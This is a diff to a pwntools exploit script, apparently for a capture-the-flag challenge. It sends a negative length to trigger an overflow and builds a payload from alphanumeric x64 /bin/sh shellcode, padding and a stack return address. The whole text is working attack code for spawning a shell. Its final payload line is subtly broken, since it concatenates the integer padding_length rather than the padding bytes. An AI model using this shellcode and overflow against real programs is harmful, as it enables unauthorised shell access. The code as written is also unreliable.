@@ -27,7 +27,14 @@ io.sendlineafter(': ', 'age')
 log.info('Send Name Lenght')
 io.sendlineafter(': ', '-1')
 
-payload = cyclic(200)
+#payload = cyclic(200)
+#Alphanumeric Shellcode x64 /bin/sh
+#https://www.exploit-db.com/exploits/35205
+shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
+#shellcode = asm(shellcraft.sh())
+padding = b'A' * (padding_length - len(shellcode))
+payload = shellcode + padding_length + p64(stack_address)
+
 
 log.info('Send payload to name')
 io.sendlineafter('Name: ', payload)
